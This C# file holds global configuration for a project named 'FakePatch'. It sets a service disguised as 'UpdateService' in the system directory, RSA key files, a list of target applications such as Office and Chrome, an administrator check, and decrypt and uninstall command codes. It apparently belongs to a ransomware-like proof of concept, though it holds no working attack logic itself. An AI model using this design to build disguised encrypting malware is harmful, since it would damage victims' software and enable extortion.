using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
//using static FakePatch.ProjectInstaller;

namespace FakePatch
{
    public static class Globals
    {
        public const string gServiceName = "UpdateService";
        public static string gServicePath = Environment.SystemDirectory;
        public static FileInfo gServiceExecutablePath = new FileInfo(Path.Combine(gServicePath, new FileInfo(Assembly.GetExecutingAssembly().Location).Name));
        public static string gKeyName = "Key01";
        public const int gKeySize = 1024;
        public static string gTempPath = @"c:\temp";
        public static string gKeyWatchPath = @"C:\keywatch";
        public static string gKeyTxtFileName = @"key.txt";
        public const int gKeyTxtSize = 1024;
        public const string gEventLogName = "MyNewLog";
        public const string gEventSourceName = "MySource";
        public static string[] gFilePaths = { @"excel.exe", @"winword.exe", @"powerpnt.exe", @"mspub.exe", @"msaccess.exe", @"outlook.exe", @"vlc.exe", @"chrome.exe", @"itunes.exe" };

        //public static FileInfo gKeyFile = new FileInfo(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), @"key.xml"));
        //public static FileInfo gPubKeyFile = new FileInfo(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), @"pubkey.xml"));
        public static FileInfo gKeyFile = new FileInfo(@"c:\temp\key.xml");
        public static FileInfo gPubKeyFile = new FileInfo(@"c:\temp\pubkey.xml");
        //the below has been disabled since is not possible to access to the running assembly directory with standard user privileges
        //public static FileInfo gLogFile = new FileInfo(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), @"log.txt"));
        public const LogTarget gLogTarget = LogTarget.File;
        public static FileInfo gLogFile = new FileInfo(@"c:\temp\log.txt");
        public static FileInfo gServiceLogFile = new FileInfo(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), @"servicelog.txt"));
        public static RSACryptoServiceProvider gRSA;

        public static bool gIsElevated
        {
            get
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        // Declare CspParmeters and RsaCryptoServiceProvider
        // objects with global scope of your Form class.

        public const bool gPersistKey = false;
        public const int DecryptCommand = 150;
        public const int UninstallCommand = 151;

    }
}
